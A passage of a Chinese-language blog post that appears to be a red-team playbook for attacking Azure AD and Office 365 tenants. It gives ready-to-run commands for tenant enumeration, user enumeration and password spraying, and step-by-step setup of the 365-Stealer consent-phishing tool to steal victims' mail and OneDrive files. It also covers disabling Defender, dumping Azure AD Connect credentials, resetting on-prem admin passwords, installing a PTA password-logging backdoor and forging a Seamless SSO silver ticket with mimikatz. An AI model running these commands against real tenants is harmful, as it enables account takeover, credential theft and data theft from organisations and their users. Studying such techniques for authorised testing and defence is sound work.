class="hljs-selector-tag">@</span>&lt;TENANT NAME&gt;.onmicrosoft.com <span class="hljs-literal">-p</span> &lt;PASSWORD&gt;<br>roadrecon gather<br>roadrecon gui<br></code></pre></td></tr></table></figure>
<p><a target="_blank" rel="noopener" href="https://github.com/Azure/Stormspotter">Azure/<em>Stormspotter</em></a></p>
<p>有点像bloodhund的资产以及攻击路径绘制工具。</p>
<p><img src="https://github.com/Azure/Stormspotter/raw/main/docs/stormspotter.png" srcset="/img/loading.gif" alt="img"></p>
<p>安装</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/Azure/Stormspotter<br>docker-compose up<br></code></pre></td></tr></table></figure>
<p>使用</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">cd</span> stormcollector<br><span class="hljs-keyword">python3</span> sscollector.pyz -h<br><span class="hljs-keyword">python3</span> sscollector.pyz cli<br><span class="hljs-keyword">python3</span> sscollector.pyz spn -t <span class="hljs-symbol">&lt;tenant&gt;</span> -<span class="hljs-keyword">c</span> <span class="hljs-symbol">&lt;clientID&gt;</span> -s <span class="hljs-symbol">&lt;clientSecret&gt;</span><br></code></pre></td></tr></table></figure>
<p>支持Azure CLI登录以及Client ID、Secret登录</p>
<p><img src="https://github.com/Azure/Stormspotter/raw/main/docs/screenshot2.png" srcset="/img/loading.gif" alt="Screenshot2"></p>
<h4 id="列举子域"><a href="#列举子域" class="headerlink" title="列举子域"></a>列举子域</h4><p><a target="_blank" rel="noopener" href="https://github.com/NetSPI/MicroBurst">NetSPI/<em>MicroBurst</em></a></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs powershell">. C:\Tools\MicroBurst\Misc\InvokeEnumerateAzureSubDomains.ps1<br><span class="hljs-built_in">Invoke-EnumerateAzureSubDomains</span> <span class="hljs-literal">-Base</span> &lt;TENANT NAME&gt; <span class="hljs-literal">-Verbose</span><br>   <span class="hljs-comment"># Subdomain Service</span><br>   <span class="hljs-comment"># --------- -------</span><br>   <span class="hljs-comment"># &lt;TENANT NAME&gt;.mail.protection.outlook.com Email</span><br>   <span class="hljs-comment"># &lt;TENANT NAME&gt;.onmicrosoft.com Microsoft Hosted Domain</span><br></code></pre></td></tr></table></figure>
<h4 id="列举租户（Azure-AD-Powershell）"><a href="#列举租户（Azure-AD-Powershell）" class="headerlink" title="列举租户（Azure AD Powershell）"></a>列举租户（Azure AD Powershell）</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Import-Module</span> C:\Tools\AzureAD\AzureAD.psd1<br><span class="hljs-built_in">Import-Module</span> C:\Tools\AzureADPreview\AzureADPreview.psd1<br><span class="hljs-variable">$passwd</span> = <span class="hljs-built_in">ConvertTo-SecureString</span> <span class="hljs-string">&quot;&lt;PASSWORD&gt;&quot;</span> <span class="hljs-literal">-AsPlainText</span> <span class="hljs-literal">-Force</span><br><span class="hljs-variable">$creds</span> = <span class="hljs-built_in">New-Object</span> System.Management.Automation.PSCredential(<span class="hljs-string">&quot;test@&lt;TENANT NAME&gt;.onmicrosoft.com&quot;</span>, <span class="hljs-variable">$passwd</span>)<br><span class="hljs-built_in">Connect-AzureAD</span> <span class="hljs-literal">-Credential</span> <span class="hljs-variable">$creds</span><br><br><span class="hljs-built_in">Get-AzureADUser</span> <span class="hljs-literal">-All</span> <span class="hljs-variable">$true</span><br><span class="hljs-built_in">Get-AzureADUser</span> <span class="hljs-literal">-All</span> <span class="hljs-variable">$true</span> | <span class="hljs-built_in">select</span> UserPrincipalName<br><span class="hljs-built_in">Get-AzureADGroup</span> <span class="hljs-literal">-All</span> <span class="hljs-variable">$true</span><br><span class="hljs-built_in">Get-AzureADDevice</span><br><span class="hljs-built_in">Get-AzureADDirectoryRole</span> <span class="hljs-literal">-Filter</span> <span class="hljs-string">&quot;DisplayName eq &#x27;Global Administrator&#x27;&quot;</span> | <span class="hljs-built_in">Get-AzureADDirectoryRoleMember</span><br><span class="hljs-built_in">PS</span> AzureADPreview&gt; <span class="hljs-built_in">Get-AzureADMSRoleDefinition</span> | ?&#123;<span class="hljs-variable">$_</span>.IsBuiltin <span class="hljs-operator">-eq</span> <span class="hljs-variable">$False</span>&#125; | <span class="hljs-built_in">select</span> DisplayName<br></code></pre></td></tr></table></figure>
<h4 id="列举租户（az-cli）"><a href="#列举租户（az-cli）" class="headerlink" title="列举租户（az cli）"></a>列举租户（az cli）</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs powershell">az login <span class="hljs-literal">-u</span> test<span class="hljs-selector-tag">@</span>&lt;TENANT NAME&gt;.onmicrosoft.com <span class="hljs-literal">-p</span> &lt;PASSWORD&gt;<br>az vm list<br>az vm list -<span class="hljs-literal">-query</span> <span class="hljs-string">&quot;[].[name]&quot;</span> <span class="hljs-literal">-o</span> table<br>az webapp list<br>az functionapp list -<span class="hljs-literal">-query</span> <span class="hljs-string">&quot;[].[name]&quot;</span> <span class="hljs-literal">-o</span> table<br>az storage account list<br>az keyvault list<br></code></pre></td></tr></table></figure>
<h4 id="在线列举"><a href="#在线列举" class="headerlink" title="在线列举"></a>在线列举</h4><ul>
<li><p>联合Azure AD or O365</p>
  <figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">https://<span class="hljs-keyword">login</span>.microsoftonline.com/getuserrealm.srf?<span class="hljs-keyword">login</span>=&lt;<span class="hljs-keyword">USER</span>&gt;@&lt;<span class="hljs-keyword">DOMAIN</span>&gt;&amp;<span class="hljs-type">xml</span>=<span class="hljs-number">1</span><br>https://<span class="hljs-keyword">login</span>.microsoftonline.com/getuserrealm.srf?<span class="hljs-keyword">login</span>=root@&lt;TENANT <span class="hljs-type">NAME</span>&gt;.onmicrosoft.com&amp;<span class="hljs-type">xml</span>=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure></li>
<li><p>获取租户id</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>login.microsoftonline.com<span class="hljs-regexp">/&lt;DOMAIN&gt;/</span>.well-known/openid-configuration<br>https:<span class="hljs-regexp">//</span>login.microsoftonline.com<span class="hljs-regexp">/&lt;TENANT NAME&gt;.onmicrosoft.com/</span>.well-known/openid-configuration<br></code></pre></td></tr></table></figure>


</li>
</ul>
<h3 id="枚举与喷洒"><a href="#枚举与喷洒" class="headerlink" title="枚举与喷洒"></a>枚举与喷洒</h3><p>在传统的AD环境中，枚举与喷洒就是非常常见的攻击方式。作为TOP1的攻击方式，枚举与喷洒是作为没有相应的较高的权限以及shell作为立足点的情况下，成本较低也比较容易有惊喜产出的选择。</p>
<p>喷洒即为使用少数可能密码对大量用户进行尝试的攻击。而作为喷洒的基础，需要获得用户作为基础。一般会使用通过各种公众平台获得的用户名，而当没有较多可用账户时，枚举用户就成为攻击第一步。</p>
<h4 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h4><p><a target="_blank" rel="noopener" href="https://github.com/LMGsec/o365creeper">O365 Creeper</a></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python C:\Tools\o365creeper\o365creeper.py -f C:\Tools\emails.txt -o C:\Tools\validemails.txt<br></code></pre></td></tr></table></figure>
<p>当你拥有有效凭据的时候，可通过该凭据获得凭据提取电子邮件列表</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Install-Module</span> MSOnline<br><span class="hljs-built_in">Install-Module</span> AzureAD<br></code></pre></td></tr></table></figure>
<p>命令</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">.\o365recon.ps1 -azure<br></code></pre></td></tr></table></figure>
<p><img src="https://camo.githubusercontent.com/dd6fb93e6f385e3113ff3ff88375beca8347ca5909070733a7f6c99f01e9080d/68747470733a2f2f7261772e6769746875622e636f6d2f6e79786765656b2f6f3336357265636f6e2f6d61737465722f73637265656e73686f742e706e673f" srcset="/img/loading.gif" alt="截屏"></p>
<h4 id="喷洒"><a href="#喷洒" class="headerlink" title="喷洒"></a>喷洒</h4><p><a target="_blank" rel="noopener" href="https://github.com/dafthack/MSOLSpra">MSOLSpra</a></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell">. C:\Tools\MSOLSpray\MSOLSpray.ps1<br><span class="hljs-built_in">Invoke-MSOLSpray</span> <span class="hljs-literal">-UserList</span> C:\Tools\validemails.txt <span class="hljs-literal">-Password</span> &lt;PASSWORD&gt; <span class="hljs-literal">-Verbose</span><br></code></pre></td></tr></table></figure>
<p><strong><em>默认情况下，Azure账户在尝试10次后就会锁定用户</em></strong></p>
<h3 id="非法授权获取"><a href="#非法授权获取" class="headerlink" title="非法授权获取"></a>非法授权获取</h3><p>攻击者创建一个 Azure 注册的应用程序，请求访问联系人、电子邮件或文档等数据。然后攻击者诱骗用户授权应用程序，以便攻击者可以访问目标用户有权访问的数据。</p>
<p>这种工具可以完美绕过MFA。</p>
<ul>
<li><p>查看用户是否有权限授权应用</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">(GetAzureADMSAuthorizationPolicy).PermissionGrantPolicyIdsAssignedToDefaultUserRole <span class="hljs-comment"># AzureADPreview</span><br></code></pre></td></tr></table></figure>
<ul>
<li><strong>禁用用户同意</strong>：用户不能授予应用程序权限。</li>
<li><strong>用户可以同意来自经过验证的发布者或您组织的应用程序，但仅限于您选择的权限</strong>：所有用户只能同意由经过验证的发布者发布的应用程序和在您的租户中注册的应用程序</li>
<li><strong>用户可以同意所有应用程序</strong>：允许所有用户授权。</li>
<li><strong>自定义应用同意政策</strong></li>
</ul>
</li>
</ul>
<h4 id="注册"><a href="#注册" class="headerlink" title="注册"></a>注册</h4><ol>
<li>登录<a target="_blank" rel="noopener" href="https://portal.azure.com/">https://portal.azure.com</a> </li>
<li>点击<strong>应用注册</strong>&gt;<strong>新注册</strong></li>
<li>输入我们的应用程序的名称</li>
<li>在支持帐户类型下选择<strong>“任何组织目录中的帐户（任何 Azure AD 目录 - 多租户）”</strong></li>
<li>输入重定向的URL。此 URL 应指向我们用于托管网络钓鱼页面的 365-Stealer 应用程序。确保端点是<code>https://&lt;DOMAIN/IP&gt;:&lt;PORT&gt;/login/authorized</code>.</li>
<li>单击<strong>注册</strong>并保存<strong>应用程序 ID</strong></li>
</ol>
<h4 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h4><ol>
<li>点击 <code>Certificates &amp; secrets</code></li>
<li>单击 ，<code>New client secret</code>然后输入<strong>说明</strong>并单击<strong>添加</strong>。</li>
<li>保存<strong>secret</strong>的值。</li>
<li>单击 API 权限 &gt; 添加权限</li>
<li>单击 Microsoft Graph &gt;<strong>委派权限</strong></li>
<li>搜索并选择下面提到的权限，然后单击添加权限<ul>
<li>Contacts.Read</li>
<li>Mail.Read / Mail.ReadWrite</li>
<li>Mail.Send</li>
<li>Notes.Read.All</li>
<li>Mailboxsettings.ReadWrite</li>
<li>Files.ReadWrite.All</li>
<li>User.ReadBasic.All</li>
<li>User.Read</li>
</ul>
</li>
</ol>
<h4 id="365-stealer"><a href="#365-stealer" class="headerlink" title="365-stealer"></a>365-stealer</h4><p><em>默认端口是443</em></p>
<ul>
<li><p>运行 XAMPP 并启动 Apache</p>
</li>
<li><p>将 365-Stealer 克隆到 </p>
<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">C:<span class="hljs-symbol">\x</span>ampp<span class="hljs-symbol">\h</span>tdocs\<br></code></pre></td></tr></table></figure>
<ul>
<li><code>git clone https://github.com/AlteredSecurity/365-Stealer.git</code></li>
</ul>
</li>
<li><p>条件</p>
<ul>
<li>python3</li>
<li>PHP CLI 或 Xampp 服务器</li>
<li><code>pip install -r requirements.txt</code></li>
</ul>
</li>
<li><p>启用 sqlite3 (Xampp &gt; Apache config &gt; php.ini) 并重启 Apache</p>
</li>
<li><p>可编辑 C:/xampp/htdocs/yourvictims/index.php 符合利用场景</p>
<ul>
<li>禁用 IP 白名单 <code>$enableIpWhiteList = false;</code></li>
</ul>
</li>
<li><p>转到 365-Stealer 管理门户 &gt; 配置（</p>
<p><a target="_blank" rel="noopener" href="http://localhost:82/365-stealer/yourVictims">http://localhost:82/365-stealer/yourVictims</a></p>
<p>）</p>
<ul>
<li><strong>Client Id</strong> (Mandatory)：这将是我们注册的应用程序的 Application(Client) Id。</li>
<li><strong>Client Secret</strong> (Mandatory)：我们创建的 Certificates &amp; secrets 选项卡中的 Secret 值。</li>
<li><strong>重定向 URL</strong>（必填）：指定我们在注册应用程序时输入的重定向 URL，例如<code>https://&lt;Domain/IP&gt;/login/authorized</code></li>
<li><strong>宏位置</strong>：我们要注入的宏文件的路径。</li>
<li><strong>OneDrive 中的扩展</strong>：我们可以提供要从受害者帐户下载的文件扩展名，或者提供<code>*</code>下载受害者 OneDrive 中存在的所有文件的扩展名。文件扩展名应该用逗号分隔，如 txt、pdf、docx 等。</li>
<li><strong>延迟</strong>：通过在窃取时指定时间（以秒为单位）来延迟请求</li>
</ul>
</li>
<li><p>创建自签名证书以使用 HTTPS</p>
</li>
<li><p>运行应用程序，单击按钮或运行以下命令： </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python 365-Stealer.py --run-app<br></code></pre></td></tr></table></figure>
<ul>
<li><code>--no-ssl</code>: 禁用HTTPS</li>
<li><code>--port</code>: 更改默认监听端口</li>
<li><code>--token</code>: 提供一个特定的令牌</li>
<li><code>--refresh-token XXX --client-id YYY --client-secret ZZZ</code>：使用刷新令牌</li>
</ul>
</li>
<li><p>找到网络钓鱼 URL：转到<code>https://&lt;IP/Domain&gt;:&lt;Port&gt;</code>并单击“<strong>阅读更多”</strong>按钮。</p>
</li>
</ul>
<h3 id="关于Token"><a href="#关于Token" class="headerlink" title="关于Token"></a>关于Token</h3><p>未完待续….（偷个懒别骂了555..）</p>
<h3 id="关于混合部署"><a href="#关于混合部署" class="headerlink" title="关于混合部署"></a>关于混合部署</h3><h4 id="Azure-AD-Connect"><a href="#Azure-AD-Connect" class="headerlink" title="Azure AD Connect"></a>Azure AD Connect</h4><p><em>参考文章：<a target="_blank" rel="noopener" href="https://blog.xpnsec.com/azuread-connect-for-redteam">https://blog.xpnsec.com/azuread-connect-for-redteam</a></em></p>
<p>当需要同时部署本地AD与Azure AD时，我们就需要用到混合部署，Azure支持与本地AD实时同步，将本地AD的凭据应用于Azure AD。而一般本地AD与Azure AD进行连接的服务为 Azure AD Connect。</p>
<p>检查是否安装Azure Connect：</p>
<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">Get-ADSyncConnector</span><br></code></pre></td></tr></table></figure>
<p>有多种方式将 Azure AD 配置为与现有的 Active Directory 部署集成。</p>
<ul>
<li><p>密码哈希同步 (PHS)</p>
<p>它将用户帐户和密码哈希从 AD 上传到 Azure</p>
</li>
<li><p>直通身份验证 (PTA)</p>
<p>它允许 Azure 将身份验证请求转发到本地 AD，而不依赖于上传哈希</p>
</li>
<li><p>联合身份验证</p>
<p>通过ADFS</p>
</li>
</ul>
<h4 id="针对不同部署的攻击"><a href="#针对不同部署的攻击" class="headerlink" title="针对不同部署的攻击"></a>针对不同部署的攻击</h4><ul>
<li>对于<strong>PHS</strong>，我们可以提取凭据</li>
<li>对于<strong>PTA</strong>，我们可以安装代理</li>
<li>对于<strong>联合部署</strong>，我们可以使用 DA 从 ADFS 服务器中提取证书</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs powershell">&gt; <span class="hljs-built_in">Set-MpPreference</span> <span class="hljs-literal">-DisableRealtimeMonitoring</span> <span class="hljs-variable">$true</span><br>&gt; <span class="hljs-built_in">Copy-Item</span> <span class="hljs-literal">-ToSession</span> <span class="hljs-variable">$adcnct</span> <span class="hljs-literal">-Path</span> C:\Tools\AADInternals.<span class="hljs-number">0.4</span>.<span class="hljs-number">5</span>.zip <span class="hljs-literal">-Destination</span> C:\Users\Administrator\Documents<br>&gt; <span class="hljs-built_in">Expand-Archive</span> C:\Users\Administrator\Documents\AADInternals.<span class="hljs-number">0.4</span>.<span class="hljs-number">5</span>.zip <span class="hljs-literal">-DestinationPath</span> C:\Users\Administrator\Documents\AADInternals<br>&gt; <span class="hljs-built_in">Import-Module</span> C:\Users\Administrator\Documents\AADInternals\AADInternals.psd1<br>&gt; <span class="hljs-built_in">Get-AADIntSyncCredentials</span><br><br><span class="hljs-comment"># Get Token for SYNC account and reset on-prem admin password</span><br>&gt; <span class="hljs-variable">$passwd</span> = ConvertToSecureString <span class="hljs-string">&#x27;password&#x27;</span> <span class="hljs-literal">-AsPlainText</span> <span class="hljs-literal">-Force</span><br>&gt; <span class="hljs-variable">$creds</span> = <span class="hljs-built_in">New-Object</span> System.Management.Automation.PSCredential (<span class="hljs-string">&quot;&lt;Username&gt;@&lt;TenantName&gt;.onmicrosoft.com&quot;</span>, <span class="hljs-variable">$passwd</span>)<br>&gt; GetAADIntAccessTokenForAADGraph <span class="hljs-literal">-Credentials</span> <span class="hljs-variable">$creds</span> –SaveToCache<br>&gt; <span class="hljs-built_in">Get-AADIntUser</span> <span class="hljs-literal">-UserPrincipalName</span> onpremadmin@defcorpsecure.onmicrosoft.com | <span class="hljs-built_in">select</span> ImmutableId<br>&gt; <span class="hljs-built_in">Set-AADIntUserPassword</span> <span class="hljs-literal">-SourceAnchor</span> <span class="hljs-string">&quot;&lt;IMMUTABLE-ID&gt;&quot;</span> <span class="hljs-literal">-Password</span> <span class="hljs-string">&quot;Password&quot;</span> <span class="hljs-literal">-Verbose</span><br></code></pre></td></tr></table></figure>
<p>检查PTA是否安装：<code>Get-Command -Module PassthroughAuthPSModule</code></p>
<p>安装PTA后门：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># AADInternals</span><br><span class="hljs-built_in">Install-AADIntPTASpy</span><br><span class="hljs-built_in">Get-AADIntPTASpyLog</span> <span class="hljs-literal">-DecodePasswords</span><br></code></pre></td></tr></table></figure>


<h4 id="密码提取"><a href="#密码提取" class="headerlink" title="密码提取"></a>密码提取</h4><p>ADSync服务存储的凭据：</p>
<figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs fortran">C:\<span class="hljs-function"><span class="hljs-keyword">Program</span></span> Files\Microsoft Azure AD <span class="hljs-built_in">Sync</span>\<span class="hljs-keyword">Data</span>\ADSync.mdf<br></code></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th>工具</th>
<th>需要在目标上执行代码</th>
<th>DLL 依赖</th>
<th>本地需要 MSSQL</th>
<th>本地需要python</th>
</tr>
</thead>
<tbody><tr>
<td>ADSyncDecrypt</td>
<td>是</td>
<td>是</td>
<td>否</td>
<td>否</td>
</tr>
<tr>
<td>ADSyncGather</td>
<td>是</td>
<td>否</td>
<td>否</td>
<td>是</td>
</tr>
<tr>
<td>ADSyncQuery</td>
<td>否（仅限网络 RPC 调用）</td>
<td>否</td>
<td>是</td>
<td>是</td>
</tr>
</tbody></table>
<p><a target="_blank" rel="noopener" href="https://github.com/fox-it/adconnectdump">fox-it/<em>adconnectdump</em></a> 该工具可以用于dump Azure AD Connect 上的凭据</p>
<h4 id="MSOL-Dcsync"><a href="#MSOL-Dcsync" class="headerlink" title="MSOL Dcsync"></a>MSOL Dcsync</h4><p>安装Azure Connect 服务将会自动安装 <code>MSOL_04tg03g043534（后面是随机hex）</code> 用户，该用户需要在域管组内或具有对目录的可写权限，大部分情况具有 DCSync 权限。</p>
<p>当你控制了Azure Connect 服务器后，可通过mimikatz转储该用户明文。</p>
<p>或者使用 XPN 的脚本：<a target="_blank" rel="noopener" href="https://gist.github.com/xpn/f12b145dba16c2eebdd1c6829267b90c">https://gist.github.com/xpn/f12b145dba16c2eebdd1c6829267b90c</a></p>
<h4 id="无缝SSO银票"><a href="#无缝SSO银票" class="headerlink" title="无缝SSO银票"></a>无缝SSO银票</h4><ul>
<li>如果没有 MFA的话，任何可以修改 AZUREADSSOACCS$ 帐户属性的人都可以使用 Kerberos 模拟 Azure AD 中的任何用户</li>
<li>PHS 和 PTA 都支持无缝 SSO。如果启用了无缝 SSO，<strong>则会</strong>在本地 AD 中创建一个计算机帐户<strong>AZUREADSSOC$</strong></li>
</ul>
<p><strong><em>注：AZUREADSSOACC 帐户的密码永远不会更改。</em></strong></p>
<p>使用 <a target="_blank" rel="noopener" href="https://autologon.microsoftazuread-sso.com/">https://autologon.microsoftazuread-sso.com/</a> 将 Kerberos 票证转换为 Office 365 和 Azure 的 SAML 和 JWT</p>
<ol>
<li><p>使用mimikatz获取机器用户hash</p>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">mimikatz.exe  <span class="hljs-string">&quot; lsadump::dcsync /user:AZUREADSSOACC<span class="hljs-variable">$</span> &quot;</span><br></code></pre></td></tr></table></figure></li>
<li><p>获取我们要模拟的用户的 AAD 登录名，例如<code>elrond@contoso.com</code>。这通常是他的 userPrincipalName 或来自本地 AD 的邮件属性</p>
</li>
<li><p>获取我们要模拟的用户的 SID，可通过域信息查看，例如<code>S-1-5-21-2121516926-2695913149-3163778339-111</code></p>
</li>
<li><p>创建银票</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">mimikatz</span><span class="hljs-selector-class">.exe</span>  &quot; <span class="hljs-selector-tag">kerberos</span><span class="hljs-selector-pseudo">::golden</span> /<span class="hljs-selector-tag">user</span><span class="hljs-selector-pseudo">:elrond</span> <br>/<span class="hljs-selector-tag">sid</span><span class="hljs-selector-pseudo">:S-1-5-21-2121516926-2695913149-3163778339</span> /<span class="hljs-selector-tag">id</span><span class="hljs-selector-pseudo">:111</span> <br>/<span class="hljs-selector-tag">domain</span><span class="hljs-selector-pseudo">:contoso.local</span> /<span class="hljs-selector-tag">rc4</span>: <br><span class="hljs-selector-tag">f9969e088b30dc7dc7dc7dc7dc7333333333</span> <span class="hljs-selector-class">.nsatc</span><span class="hljs-selector-class">.net</span> /<span class="hljs-selector-tag">service</span><span class="hljs-selector-pseudo">:HTTP</span> /<span class="hljs-selector-tag">ptt</span> &quot;<br></code></pre></td></tr></table></figure></li>
<li><p>启动 Mozilla Firefox</p>
</li>
<li><p>转到 about:config 并设置<code>network.negotiate-auth.trusted-uris preference</code> 的值为<code>https://aadg.windows.net.nsatc.net,https://autologon.microsoftazuread-sso.com</code></p>
</li>
<li><p>导航到与我们的 AAD 域集成的任何 Web 应用程序。填写用户名，同时将密码字段留空。</p>
</li>
</ol>

            </div>
            <hr>
            <div>
              <div class="post-metas mb-3">
                
                  <div class="post-meta mr-3">
                    <i class="iconfont icon-category"></i>
                    
                      <a class="hover-with-bg" href="/categories/AD/">AD</a>
                    
                  </div>
                
                
                  <div class="post-meta">
                    <i class="iconfont icon-tags"></i>
                    
                      <a class="hover-with-bg" href="/tags/AD/">AD</a>
                    
                      <a class="hover-with-bg" href="/tags/Azure-AD/">Azure AD</a>
                    
                  </div>
                
              </div>
              
                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
              
              
                <div class="post-prevnext">
                  <article class="post-prev col-6">
                    
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2021/05/02/%E7%8E%B0%E5%9C%A8%E6%98%AF%EF%BC%8C%E5%87%8C%E6%99%A8%E4%B8%89%E7%82%B9%E4%BA%8C%E5%8D%81%E4%B8%89%E5%88%86/">
                        <span class="hidden-mobile">现在是，凌晨三点二十三分</span>
                        <span class="visible-mobile">Next</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>
    
      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
        <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
  <div class="toc-body" id="toc-body"></div>
</div>

      </div>
    
  </div>
</div>

<!-- Custom -->


    

    
      <a id="scroll-top-button" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v"
                 for="local-search-input">keyword</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
    

    
  </main>

  <footer class="text-center mt-5 py-3">
  <div class="footer-content">
     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
  </div>
  

  

  
</footer>

<!-- SCRIPTS -->

  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js" ></script>
<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
<script  src="/js/debouncer.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>

<!-- Plugins -->


  
    <script  src="/js/lazyload.js" ></script>
  



  



  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.0/dist/tocbot.min.js" ></script>



  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>



  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>



  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js" ></script>






  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var title = document.getElementById('subtitle').title;
      
      typing(title)
      
    })(window, document);
  </script>



  <script  src="/js/local-search.js" ></script>
  <script>
    (function () {
      var path = "/local-search.xml";
      var inputArea = document.querySelector("#local-search-input");
      inputArea.onclick = function () {
        searchFunc(path, 'local-search-input', 'local-search-result');
        this.onclick = null
      }
    })()
  </script>















<!-- 主题的启动项 保持在最底部 -->
<script  src="/js/boot.js" ></script>



</body>
</html>
